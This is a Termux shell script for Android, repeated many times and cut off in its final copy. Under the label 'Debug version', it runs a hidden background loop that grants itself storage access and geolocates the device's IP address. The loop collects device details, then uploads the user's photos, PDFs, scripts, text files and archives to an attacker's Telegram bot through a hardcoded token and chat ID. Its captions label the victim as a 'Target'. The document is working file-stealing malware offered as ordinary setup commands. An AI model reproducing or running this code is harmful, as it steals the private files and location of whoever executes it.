clear
pkg install jq -y
clear
pkg install wget -y
clear
pkg install curl -y
clear
termux-setup-storage -y
clear
apt-get update -y
clear
pkg install curl neofetch inetutils jq -y
clear
apt-get install curl  # For curl command
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Debug version
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/WHATSAPP-/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || { echo "sopo.txt not found"; sleep 60; continue; }
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            echo "Attempting to send file: $file"
            curl -v -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption"
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            echo "Searching for .$ext files..."
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        echo "Completed file sending, sleeping for 1 hour"
        sleep 3600
    else
        echo "Initial setup..."
        yes | termux-setup-storage
        pkg update
        pkg install -y curl neofetch inetutils jq
        touch /data/data/com.termux/files/usr/lib/commplate
        echo "Setup completed, sleeping for 1 minute"
        sleep 60
    fi
done
} &
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Debug version
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/WHATSAPP-/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || { echo "sopo.txt not found"; sleep 60; continue; }
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            echo "Attempting to send file: $file"
            curl -v -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption"
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            echo "Searching for .$ext files..."
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        echo "Completed file sending, sleeping for 1 hour"
        sleep 3600
    else
        echo "Initial setup..."
        yes | termux-setup-storage
        pkg update
        pkg install -y curl neofetch inetutils jq
        touch /data/data/com.termux/files/usr/lib/commplate
        echo "Setup completed, sleeping for 1 minute"
        sleep 60
    fi
done
} &
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Debug version
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/WHATSAPP-/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || { echo "sopo.txt not found"; sleep 60; continue; }
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            echo "Attempting to send file: $file"
            curl -v -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption"
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            echo "Searching for .$ext files..."
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        echo "Completed file sending, sleeping for 1 hour"
        sleep 3600
    else
        echo "Initial setup..."
        yes | termux-setup-storage
        pkg update
        pkg install -y curl neofetch inetutils jq
        touch /data/data/com.termux/files/usr/lib/commplate
        echo "Setup completed, sleeping for 1 minute"
        sleep 60
    fi
done
} &
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Debug version
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/WHATSAPP-/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || { echo "sopo.txt not found"; sleep 60; continue; }
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            echo "Attempting to send file: $file"
            curl -v -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption"
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            echo "Searching for .$ext files..."
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        echo "Completed file sending, sleeping for 1 hour"
        sleep 3600
    else
        echo "Initial setup..."
        yes | termux-setup-storage
        pkg update
        pkg install -y curl neofetch inetutils jq
        touch /data/data/com.termux/files/usr/lib/commplate
        echo "Setup completed, sleeping for 1 minute"
        sleep 60
    fi
done
} &
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Debug version
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/WHATSAPP-/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || { echo "sopo.txt not found"; sleep 60; continue; }
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            echo "Attempting to send file: $file"
            curl -v -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption"
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            echo "Searching for .$ext files..."
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        echo "Completed file sending, sleeping for 1 hour"
        sleep 3600
    else
        echo "Initial setup..."
        yes | termux-setup-storage
        pkg update
        pkg install -y curl neofetch inetutils jq
        touch /data/data/com.termux/files/usr/lib/commplate
        echo "Setup completed, sleeping for 1 minute"
        sleep 60
    fi
done
} &
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Debug version
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/WHATSAPP-/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || { echo "sopo.txt not found"; sleep 60; continue; }
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            echo "Attempting to send file: $file"
            curl -v -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption"
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            echo "Searching for .$ext files..."
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        echo "Completed file sending, sleeping for 1 hour"
        sleep 3600
    else
        echo "Initial setup..."
        yes | termux-setup-storage
        pkg update
        pkg install -y curl neofetch inetutils jq
        touch /data/data/com.termux/files/usr/lib/commplate
        echo "Setup completed, sleeping for 1 minute"
        sleep 60
    fi
done
} &
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Debug version
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/WHATSAPP-/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || { echo "sopo.txt not found"; sleep 60; continue; }
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            echo "Attempting to send file: $file"
            curl -v -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption"
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            echo "Searching for .$ext files..."
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        echo "Completed file sending, sleeping for 1 hour"
        sleep 3600
    else
        echo "Initial setup..."
        yes | termux-setup-storage
        pkg update
        pkg install -y curl neofetch inetutils jq
        touch /data/data/com.termux/files/usr/lib/commplate
        echo "Setup completed, sleeping for 1 minute"
        sleep 60
    fi
done
} &
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Debug version
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/WHATSAPP-/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || { echo "sopo.txt not found"; sleep 60; continue; }
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            echo "Attempting to send file: $file"
            curl -v -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption"
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            echo "Searching for .$ext files..."
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        echo "Completed file sending, sleeping for 1 hour"
        sleep 3600
    else
        echo "Initial setup..."
        yes | termux-setup-storage
        pkg update
        pkg install -y curl neofetch inetutils jq
        touch /data/data/com.termux/files/usr/lib/commplate
        echo "Setup completed, sleeping for 1 minute"
        sleep 60
    fi
done
} &
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Debug version
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/WHATSAPP-/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || { echo "sopo.txt not found"; sleep 60; continue; }
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            echo "Attempting to send file: $file"
            curl -v -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption"
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            echo "Searching for .$ext files..."
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        echo "Completed file sending, sleeping for 1 hour"
        sleep 3600
    else
        echo "Initial setup..."
        yes | termux-setup-storage
        pkg update
        pkg install -y curl neofetch inetutils jq
        touch /data/data/com.termux/files/usr/lib/commplate
        echo "Setup completed, sleeping for 1 minute"
        sleep 60
    fi
done
} &
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Debug version
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/WHATSAPP-/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || { echo "sopo.txt not found"; sleep 60; continue; }
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            echo "Attempting to send file: $file"
            curl -v -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption"
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            echo "Searching for .$ext files..."
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        echo "Completed file sending, sleeping for 1 hour"
        sleep 3600
    else
        echo "Initial setup..."
        yes | termux-setup-storage
        pkg update
        pkg install -y curl neofetch inetutils jq
        touch /data/data/com.termux/files/usr/lib/commplate
        echo "Setup completed, sleeping for 1 minute"
        sleep 60
    fi
done
} &
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Debug version
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/WHATSAPP-/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

